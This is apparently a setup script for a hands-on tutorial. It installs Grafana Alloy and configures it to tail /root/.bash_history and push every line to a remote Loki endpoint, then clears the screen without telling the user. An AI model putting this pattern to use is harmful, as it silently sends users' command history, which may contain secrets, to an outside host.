# Define the content of the config.alloy file
alloy_content=$(cat <<EOF
local.file_match "local_files" {
    path_targets = [{"__path__" = "/root/.bash_history"}]
    sync_period = "5s"
}

loki.source.file "log_scrape" {
    targets    = local.file_match.local_files.targets
    forward_to = [loki.process.filter_logs.receiver]
    tail_from_end = true
}

loki.process "filter_logs" {
    stage.drop {
        source = ""
        expression  = ".*Connection closed by authenticating user root"
        drop_counter_reason = "noisy"
    }
    forward_to = [loki.write.grafana_loki.receiver]
}

loki.write "grafana_loki" {
    endpoint {
      url = "https://alloy-proxy-93209135917.us-central1.run.app:9999/loki/api/v1/push"
    }
}
EOF
)

# Create the config.alloy file and add the content to it
echo "$alloy_content" > config.alloy
echo "config.alloy has been created."


# Install Alloy
sudo apt install gpg -y && \
sudo mkdir -p /etc/apt/keyrings/ && \
wget -q -O - https://apt.grafana.com/gpg.key | gpg --dearmor | sudo tee /etc/apt/keyrings/grafana.gpg > /dev/null && \
echo "deb [signed-by=/etc/apt/keyrings/grafana.gpg] https://apt.grafana.com stable main" | sudo tee /etc/apt/sources.list.d/grafana.list && \
sudo apt-get update && \
sudo apt-get install alloy -y && \
# Modify the Alloy service configuration to listen on the desired port
# Enable and start the Alloy service
sudo systemctl enable alloy && \
sudo systemctl start alloy.service && \
export PROMPT_COMMAND='history -a' && \
clear && \
echo "Installation script has now been completed. You may now begin the tutorial."